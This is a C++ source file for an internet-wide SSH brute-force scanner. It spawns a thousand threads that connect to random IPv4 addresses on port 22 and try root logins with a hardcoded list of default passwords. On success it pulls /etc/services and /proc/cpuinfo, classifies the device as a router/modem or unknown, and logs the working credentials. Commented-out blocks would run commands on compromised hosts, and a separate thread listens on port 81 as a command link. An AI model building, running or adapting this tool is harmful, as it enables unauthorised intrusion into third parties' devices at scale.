//ni0s
#include "scanner.h"
int yes = 0;
int do_scan = 1;
int ipscanned = 0;
struct timeval tv;
int id1, id2, result;
pthread_t thread1;
int founds = 0;
int totscanned = 0;
std::list<unsigned long> checking;
static pthread_mutex_t checking_mutex = PTHREAD_MUTEX_INITIALIZER;
#define TOTAL_VAL_COUNT 254
int byteval_array[TOTAL_VAL_COUNT] = {
	 1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
	11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
	21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
	31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
	41, 42, 43, 44, 45, 46, 47, 48, 49, 50,
	51, 52, 53, 54, 55, 56, 57, 58, 59, 60,
	61, 62, 63, 64, 65, 66, 67, 68, 69, 70,
	71, 72, 73, 74, 75, 76, 77, 78, 79, 80,
	81, 82, 83, 84, 85, 86, 87, 88, 89, 90,
	91, 92, 93, 94, 95, 96, 97, 98, 99, 100,
	101, 102, 103, 104, 105, 106, 107, 108, 109, 110,
	111, 112, 113, 114, 115, 116, 117, 118, 119, 120,
	121, 122, 123, 124, 125, 126, 127, 128, 129, 130,
	131, 132, 133, 134, 135, 136, 137, 138, 139, 140,
	141, 142, 143, 144, 145, 146, 147, 148, 149, 150,
	151, 152, 153, 154, 155, 156, 157, 158, 159, 160,
	161, 162, 163, 164, 165, 166, 167, 168, 169, 170,
	171, 172, 173, 174, 175, 176, 177, 178, 179, 180,
	181, 182, 183, 184, 185, 186, 187, 188, 189, 190,
	191, 192, 193, 194, 195, 196, 197, 198, 199, 200,
	201, 202, 203, 204, 205, 206, 207, 208, 209, 210,
	211, 212, 213, 214, 215, 216, 217, 218, 219, 220,
	221, 222, 223, 224, 225, 226, 227, 228, 229, 230,
	231, 232, 233, 234, 235, 236, 237, 238, 239, 240,
	241, 242, 243, 244, 245, 246, 247, 248, 249, 250,
	251, 252, 253, 254
};


unsigned char denominator = TOTAL_VAL_COUNT + 1;

unsigned char generate_byte_val()
{
	 unsigned char inx, random_val;

	 if (denominator == 1)
		  denominator = TOTAL_VAL_COUNT + 1;
	 inx = (rand() + 1) % 254;
	 random_val = byteval_array[inx];
	 byteval_array[inx] = byteval_array[--denominator];
	 byteval_array[denominator] = random_val;
	 return random_val;
}
//class MySexec : public SExec
//{
//public:
//	 int FireStderr(SExecStderrEventParams* e)
//	 {
//		  fwrite(e->Text, 1, e->lenText, stderr);
//		  return 0;
//	 }
//	 int FireStdout(SExecStdoutEventParams* e)
//	 {
//		  fwrite(e->Text, 1, e->lenText, stdout);
//		  return 0;
//	 }
//	 int FireSSHServerAuthentication(SExecSSHServerAuthenticationEventParams* e)
//	 {
//		  e->Accept = true;
//		  return 0;
//	 }
//};
/* get random */
unsigned long getrnd2(unsigned long min, unsigned long max)
{
	 unsigned long long int random_value = 0; //Declare value to store data into
	 size_t size = sizeof(random_value); //Declare size of data
	 ifstream urandom("/dev/urandom", ios::in | ios::binary); //Open stream
	 if (urandom) //Check if stream is open
	 {
		  urandom.read(reinterpret_cast<char*>(&random_value), size); //Read from urandom
		  if (urandom) //Check if stream is ok, read succeeded
		  {
				//std::cout << "Read random value: " << random_value << std::endl;
		  }
		  else //Read failed
		  {
				std::cerr << "Failed to read from /dev/urandom" << std::endl;
		  }
		  urandom.close(); //close stream
	 }
	 else //Open failed
	 {
		  std::cerr << "Failed to open /dev/urandom" << std::endl;
	 }

	 return random_value;
	 //return (min + (value % max - min));
	 //return (min + (rand() % max - min));
}
unsigned long getrnd(unsigned long min, unsigned long max)
{
	 boost::random::mt19937 gen((int)pthread_self() + (int)time(NULL));
	 pthread_mutex_t boost_mutex = PTHREAD_MUTEX_INITIALIZER;
	 pthread_mutex_lock(&boost_mutex);
	 boost::random::uniform_int_distribution<> dist(min, max);
	 unsigned long ret = dist(gen);
	 pthread_mutex_unlock(&boost_mutex);
	 return ret;
}
bool erasechecking(unsigned long sr)
{
	 pthread_mutex_lock(&checking_mutex);
	 //deb("%p removing %lu\r\n", pthread_self(), sr);
	 checking.remove(sr);
	 pthread_mutex_unlock(&checking_mutex);
	 return true;
}
bool addchecking(unsigned long sr)
{
	 pthread_mutex_lock(&checking_mutex);
	 checking.unique();
	 checking.push_back(sr);
	 //deb("%p add %lu\r\n", pthread_self(), sr);
	 pthread_mutex_unlock(&checking_mutex);
	 return 0;
}
bool ischecking(unsigned long sr)
{
	 pthread_mutex_lock(&checking_mutex);
	 // deb("%p is checking %lu\r\n", pthread_self(), sr);
	 for (std::list<unsigned long>::iterator it = checking.begin();it != checking.end();++it)
	 {
		  if (*it == sr)
		  {
				deb("%x checking %lu\r\n", pthread_self(), sr);
				pthread_mutex_unlock(&checking_mutex);
				return true;
		  }
	 }
	 pthread_mutex_unlock(&checking_mutex);
	 return false;
}
void* scanThread(void* arg)
{
	 int sockfd;
	 sockaddr_in  serv_addr;
	 char curhost[255];
	 boost::random::uniform_int_distribution<> dist(1, 9999999999999);//numeric_limits< unsigned long>::max());
	 boost::random::mt19937 gen((int)pthread_self() + (int)time(NULL));
	 LIBSSH2_SESSION* session = 0;
	 // HCkSsh ssh;
	 srand((int)pthread_self() + time(NULL));
	 while (do_scan)
	 {
		  sockfd = socket(AF_INET, SOCK_STREAM, 0);
		  if (sockfd < 0)
				deb("ERROR opening socket: %s\r\n", fmterr());

		  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));

		  long flags;

		  flags = fcntl(sockfd, F_GETFL, 0);
		  fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
		  bzero((char*)&serv_addr, sizeof(serv_addr));

		  serv_addr.sin_family = AF_INET;
		  serv_addr.sin_port = htons(22);

		  do
		  {
				char ipAddr[128];
				sprintf(ipAddr, "%d.%d.%d.%d", rand() % 255, rand() % 255, rand() % 255, rand() % 255);

				//deb("IP = %s\n", inet_ntoa(serv_addr.sin_addr));

				serv_addr.sin_addr.s_addr = inet_addr(ipAddr);

		  } while (ischecking(serv_addr.sin_addr.s_addr));
		  strncpy(curhost, inet_ntoa(serv_addr.sin_addr), sizeof(curhost));
		  //deb("scan %s\r\n", curhost);
		  addchecking(serv_addr.sin_addr.s_addr);

		  unsigned long chkdist = 0;

		  chkdist = dist(gen);

		  int ret;
		  //   deb("\rconnecting %16s ", inet_ntoa(serv_addr.sin_addr));

		  ret = connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

		  fd_set fds;

		  //deb("ret:%d errno:%s (%d)\r\n",ret,strerror(errno),errno);
		  // sleep(1);
		  FD_ZERO(&fds);
		  FD_SET(sockfd, &fds);
		  tv.tv_sec = 2;
		  tv.tv_usec = 0;
		  char buf[1024];
		  if (ret == 0 || (ret == -1 && errno == EINPROGRESS))
		  {
				ipscanned++;
				int res = select(sockfd + 1, &fds, &fds, 0, &tv);
				//deb("res:%d errno:%s (%d)\r\n",res,strerror(errno),errno);
				if (res < 0 && errno != EINTR)
				{
					 //      deb("\r\n%s Error connecting %d - %s\n\r",
					 //  	curhost, errno, strerror(errno));
				}
				else if (res > 0)
				{
					 flags &= (~O_NONBLOCK);
					 if (fcntl(sockfd, F_SETFL, flags) < 0)
					 {
						  deb("Error fcntl(..., F_SETFL) (%s)\n", strerror(errno));
					 }
					 int rcv;
					 memset(buf, 0, sizeof(buf));
					 rcv = recv(sockfd, buf, sizeof(buf), MSG_PEEK);
					 //if (rcv>0)
					 //  buf[rcv]=0;
					 // if (rcv>0)
					 // deb("rcv: %d %s\r\n",rcv, trim(buf));
					 const char* username = "root";
					 const char* password = "root";
					 const char* sftppath = "/tmp";
					 int rc;
					 const char* fingerprint;
					 session = libssh2_session_init();
					 libssh2_session_set_blocking(session, 1);
					 int numTry = 0;
					 while (session > 0 && (rc = libssh2_session_handshake(session, sockfd)) ==
						  LIBSSH2_ERROR_EAGAIN);
					 int u;
					 LIBSSH2_CHANNEL* channel = 0;
					 if (rc)
					 {
						  if (rc != -43)
						  {
								char* errmsg;
								libssh2_session_last_error(session, &errmsg, NULL, NULL);

								deb(KRED "%16s [rnd: %lu, checking: %d, msg: %s]\n",
									 curhost, chkdist, checking.size(), errmsg);
						  }
						  //return -1;
					 }
					 else
					 {
						  totscanned++;
						  fingerprint = libssh2_hostkey_hash(session, LIBSSH2_HOSTKEY_HASH_SHA1);
						  deb("%16s %-50s ", inet_ntoa(serv_addr.sin_addr),
								trim(buf));
						  for (int i = 0; i < 20; i++)
						  {
								deb(KYEL "%02X " RESET, (unsigned char)fingerprint[i]);
						  }
						  deb("\n");
						  char* passwords[] = { "root","admin","toor","r00t","adm",
													"secure","pwd","password","god"
						  };
						  for (u = 0;u < 3;u++)
						  {
								int ret;
								if (ret = libssh2_userauth_password(session, username, passwords[u]) != 0)
								{
									 char* errmsg;
									 libssh2_session_last_error(session, &errmsg, NULL, NULL);

									 deb("%16s " KRED "[%s] [ret:%d, msg:%s]\n"
										  RESET, inet_ntoa(serv_addr.sin_addr), passwords[u], ret, errmsg);

									 continue;
								}
								else
								{
									 deb(KCYN "%16s authenticated %s:%s \r\n" RESET,
										  inet_ntoa(serv_addr.sin_addr),
										  username, passwords[u], totscanned);
									 struct stat fileinfo;
									 channel = libssh2_scp_recv(session, "/etc/services", &fileinfo);
									 if (!channel)
									 {
										  deb(KRED "%16s Unable to open a session: %d\r\n" RESET,
												inet_ntoa(serv_addr.sin_addr),
												libssh2_session_last_errno(session));
										  break;
									 }
									 if (!fileinfo.st_size)
									 {
										  deb(KGRN "%16s router/modem\r\n" RESET, inet_ntoa(serv_addr.sin_addr),
												fileinfo.st_size);
										  fdeb("%s %s:%s [router/modem (%s)]\r\n", inet_ntoa(serv_addr.sin_addr),
												username, passwords[u], trim(buf));
									 }
									 else
									 {
										  deb(KGRN "%16s unknown device fs:%d [%s]\r\n" RESET,
												inet_ntoa(serv_addr.sin_addr),
												fileinfo.st_size, trim(buf));
										  fdeb("%s %s:%s unknown (%s)\r\n", inet_ntoa(serv_addr.sin_addr),
												username, passwords[u], trim(buf));
									 }
									 channel = libssh2_scp_recv(session, "/proc/cpuinfo", &fileinfo);
									 if (!channel)
									 {
										  //  deb(KRED "\r\nUnable to open a session: %d\r\n" RESET,
										  //      libssh2_session_last_errno(session));
										  //break;
									 }
									 else
									 {
										  int got = 0;
										  char mem[1024];
										  int amount = sizeof(mem);
										  while (got < fileinfo.st_size)
										  {
												if ((fileinfo.st_size - got) < amount)
												{
													 amount = fileinfo.st_size - got;
												}
												rc = libssh2_channel_read(channel, mem, amount);
												if (rc > 0)
												{
													 deb("mem:%p rc:%d", mem, rc);
												}
												else if (rc < 0)
												{
													 deb("libssh2_channel_read() failed: %d\n", rc);
													 break;
												}
												got += rc;
										  }
										  if (mem[0])
												deb("mem: %s", mem);
									 }
									 founds++;
									 //try
									 //{
										//  MySexec sexec;
										//  sexec.SetSSHHost(curhost);
										//  int ret_code = sexec.SetTimeout(17);
										//  if (ret_code) throw("\r\nfailed: SetTimeout\r\n");
										//  ret_code = sexec.SetSSHUser(username);
										//  if (ret_code) throw("\r\nfailed: SetSSHUser\r\n");
										//  ret_code = sexec.SetSSHPassword(passwords[u]);
										//  if (ret_code) throw("\r\nfailed: SetSSHPassword()\r\n");
										//  ret_code = sexec.SSHLogon(curhost, 22);
										//  if (ret_code) throw("\r\nfailed: SSHLogon\r\n");
										//  ret_code = sexec.Execute("ls -l");
										//  if (ret_code) throw("\r\Execute:%d", ret_code);
										//  //sleep(2);
										//  deb(KGRN "executed on %s\r\n" RESET, curhost);
										//  // fdeb("\r\n[host %s]\r\n",curhost);
										//	// exit(0);
									 //}
									 //catch (const char* str)
									 //{
										//  deb(KRED "in except: %s\r\n" RESET, str);
									 //}
									 //exit(0);
								}
						  }
						  //  free(fingerprint);
					 }
					 if (channel)
						  libssh2_channel_free(channel);
					 if (session)
					 {
						  // libssh2_session_disconnect(session, "Norm");
						  libssh2_session_free(session);
					 }
					 /*   ssh = CkSsh_Create();
						 bool success;
						 CkSsh_UnlockComponent(ssh,"Anything for 30-day trial");
						 success = CkSsh_Connect(ssh,inet_ntoa(serv_addr.sin_addr),22);
						 CkSsh_putIdleTimeoutMs(ssh,5000);
						 success = CkSsh_AuthenticatePw(ssh,"root","root");
						 if (success != TRUE)
						 {
							  deb("%s\n",CkSsh_lastErrorText(ssh));
							  return 0;
						 }
						 int channelNum;
						 channelNum = CkSsh_OpenSessionChannel(ssh);
						 if (channelNum < 0)
						 {
							  deb("%s\n",CkSsh_lastErrorText(ssh));
							 return 0;
						 }
						 success = CkSsh_SendReqExec(ssh,channelNum,"uname -a");
						 if (success != TRUE)
						 {
							  deb("%s\n",CkSsh_lastErrorText(ssh));
							  return 0;
						 }
						 //  Call ChannelReceiveToClose to read
						 //  output until the server's corresponding "channel close" is received.
						 success = CkSsh_ChannelReceiveToClose(ssh,channelNum);
						 if (success != TRUE)
						 {
							  deb("%s\n",CkSsh_lastErrorText(ssh));
							 return 0;
						 }
						 //  Let's pickup the accumulated output of the command:
						 const char * cmdOutput;
						 cmdOutput = CkSsh_getReceivedText(ssh,channelNum,"ansi");
						 if (cmdOutput == 0 )
						 {
							  deb("%s\n",CkSsh_lastErrorText(ssh));
							  return 0;
						 }
						 //  Display the remote shell's command output:
						 deb("%s\n",cmdOutput);
						 //  Disconnect
						 CkSsh_Disconnect(ssh);
						 CkSsh_Dispose(ssh);*/
				}
		  }
		  erasechecking(serv_addr.sin_addr.s_addr);
		  close(sockfd);
	 }
}
void* CmdLinkThread(void* arg)
{
	 deb("CmdLinkThread %x\r\n", pthread_self());
	 while (true)
	 {
		  int sockfd, newsockfd, portno;
		  socklen_t clilen;
		  char buffer[256];
		  struct sockaddr_in serv_addr, cli_addr;
		  int n;

		  // create a socket
		  // socket(int domain, int type, int protocol)
		  sockfd = socket(AF_INET, SOCK_STREAM, 0);
		  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));
		  if (sockfd < 0)
				deb("ERROR opening socket");
		  // clear address structure
		  bzero((char*)&serv_addr, sizeof(serv_addr));

		  /* setup the host_addr structure for use in bind call */
		  // server byte order
		  serv_addr.sin_family = AF_INET;
		  // automatically be filled with current host's IP address
		  serv_addr.sin_addr.s_addr = INADDR_ANY;
		  // convert short integer value for port must be converted into network byte order
		  serv_addr.sin_port = htons(81);
		  // bind(int fd, struct sockaddr *local_addr, socklen_t addr_length)
		  // bind() passes file descriptor, the address structure,
		  // and the length of the address structure
		  // This bind() call will bind  the socket to the current IP address on port, portno
		  if (bind(sockfd, (struct sockaddr*)&serv_addr,
				sizeof(serv_addr)) < 0)
				deb("ERROR on binding");
		  // This listen() call tells the socket to listen to the incoming connections.
		  // The listen() function places all incoming connection into a backlog queue
		  // until accept() call accepts the connection.
		  // Here, we set the maximum size for the backlog queue to 5.
		  listen(sockfd, 5);
		  // The accept() call actually accepts an incoming connection
		  clilen = sizeof(cli_addr);
		  // This accept() function will write the connecting client's address info
		  // into the the address structure and the size of that structure is clilen.
		  // The accept() returns a new socket file descriptor for the accepted connection.
		  // So, the original socket file descriptor can continue to be used
		  // for accepting new connections while the new socker file descriptor is used for
		  // communicating with the connected client.
		  newsockfd = accept(sockfd,
				(struct sockaddr*)&cli_addr, &clilen);
		  if (newsockfd < 0)
				deb("ERROR on accept");
		  deb("server: got connection from %s port %d\n",
				inet_ntoa(cli_addr.sin_addr), ntohs(cli_addr.sin_port));
		  // This send() function sends the 13 bytes of the string to the new socket
		  send(newsockfd, "Hello, world!\n", 13, 0);
		  bzero(buffer, 256);
		  n = read(newsockfd, buffer, 255);
		  if (n < 0) deb("ERROR reading from socket");
		  deb("Here is the message: %s\n", buffer);
		  close(newsockfd);
		  close(sockfd);

	 }
}
int main(int argc, char** argv)
{
	 deb("scanner 0.1\r\n");

	 int ret = pthread_mutex_init(&checking_mutex, NULL);
	 if (ret)
		  deb("mutex init: %s\r\n", strerror(ret));

	 id1 = 1;
	 for (int i = 0;i < 1000;i++)
	 {
		  id1++;
		  result = pthread_create(&thread1, NULL, scanThread, &id1);
	 }
	 deb(" %d threads running\r\n", id1);
	 pthread_create(&thread1, NULL, CmdLinkThread, &id1);
	 int ttime = time(NULL);
	 while (do_scan)
	 {
		  sleep(1);
		  if (time(NULL) > ttime + 32)
		  {
				deb(KCYN "\r\n -- sshds: %lu ips: %d founds: %d\r\n\r\n" RESET,
					 totscanned, ipscanned, founds);
				// totscanned=0;
				//sleep(1);
				ttime = time(NULL);
				//	system("./scanner &");
				//	exit(0);
		  }
	 }
	 return 0;
}